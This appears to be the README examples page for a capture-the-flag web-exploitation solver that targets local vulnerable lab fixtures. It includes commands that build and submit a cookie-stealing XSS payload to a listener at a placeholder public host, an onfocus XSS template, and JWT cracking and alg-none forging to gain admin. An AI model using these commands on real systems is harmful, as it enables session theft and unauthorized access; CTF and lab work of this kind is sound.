# Examples

## Try the solver against a local vulnerable lab

Spin up one of the bundled (intentionally vulnerable, 127.0.0.1-only) fixtures,
then point the solver at it:

```bash
# Terminal 1 — serve a fixture (ssti | sqli | lfi | cmdi | xss | bot)
python examples/vuln_lab.py ssti 8099

# Terminal 2 — solve it
webctf solve --url http://127.0.0.1:8099/ --ack-authorized --no-paths
```

Expected: the SSTI fixture is detected and the flag is read out and printed as
`FLAG: flag{ssti_stdlib_demo}  (verified via ssti)`.

Swap `ssti` for `sqli`, `lfi`, or `cmdi` to watch UNION extraction, path
traversal, and command-injection flag retrieval respectively.

## Offline source analysis

```bash
webctf analyze --source ./dist.zip
# or a directory / tarball:
webctf analyze --source ./challenge_src/
```

This fingerprints the framework, runs Python AST taint analysis, flags JS
prototype-pollution / JSON-interpolation gadgets, parses Docker files, and lists
routes and user-input sources — entirely offline.

## White-box + live (the strongest mode)

When the challenge ships source, give the solver both. Source findings raise the
priority of the matching live probes:

```bash
webctf solve --url http://CHALLENGE-IP:PORT/ --source dist.zip \
    --ack-authorized --flag-regex 'PCC\{[^}]+\}' --output ./report
```

## Admin-bot / report-endpoint challenges

Submit a single chosen URL/payload to the bot:

```bash
webctf bot --url http://CHALLENGE-IP:PORT/ \
    --report-path /report \
    --bot-base http://127.0.0.1:3000/ \
    --inject-param html_input \
    --payload-file ./examples/inert-xss.html \
    --ack-authorized
```

### Automatic cookie-exfil (`--capture`)

For a bot that carries a JS-readable secret cookie, `--capture` does the whole
loop: stands up a **local** capture listener, builds a cookie-exfil XSS payload
pointed at it, submits it to `/report`, waits for the bot's browser to fire it,
and prints the captured flag. Nothing is sent to any third party.

```bash
# Local challenge (bot runs on 127.0.0.1): the exfil URL is auto-detected.
webctf bot --url http://CHALLENGE-IP:PORT/ \
    --bot-base http://127.0.0.1:8000/ --inject-param html_input \
    --capture --ack-authorized

# Remote bot: give it a URL it can reach (public IP or a tunnel), and override
# the carrier tag/payload if the challenge filters the default <h1 autofocus>:
webctf bot --url http://CHALLENGE-IP:PORT/ \
    --bot-base http://127.0.0.1:8000/ --inject-param html_input \
    --capture --listener-url http://YOUR-PUBLIC-HOST:9001/ --listen-port 9001 \
    --xss-payload "<h1 tabindex=1 autofocus onfocus={JS}>x</h1>" \
    --wait 30 --ack-authorized
```

`{URL}` / `{JS}` placeholders are substituted in `--xss-payload`; `--exfil`
chooses what to steal (`cookie` default, or `location`/`storage`/`body`).

See [pparse.md](pparse.md) for a worked distributed-source example.

## JWT tinkering (offline)

```bash
webctf jwt <token> --crack                 # try a small HS256 secret wordlist
webctf jwt <token> --forge-none --set role=admin
webctf jwt <token> --secret leaked_secret --set admin=true
```
